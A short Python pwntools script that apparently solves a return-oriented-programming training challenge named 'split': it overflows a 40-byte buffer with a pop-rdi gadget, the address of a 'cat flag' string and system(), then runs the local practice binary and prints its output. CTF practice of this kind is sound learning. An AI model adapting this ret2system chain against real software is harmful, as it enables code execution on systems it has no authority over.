from pwn import *

context.arch = "amd64"
elf = context.binary = ELF('./split')

POP_RDI_GADGET = p64(0x4007c3)
CATFLAG = p64(0x601060)
SYSTEM = p64(elf.symbols.system)

payload = b'A' * 40

payload += POP_RDI_GADGET
payload += CATFLAG
payload += SYSTEM

conn = process(elf.path)

conn.recvuntil(b'> ')

conn.send(payload)

print(conn.recvall())
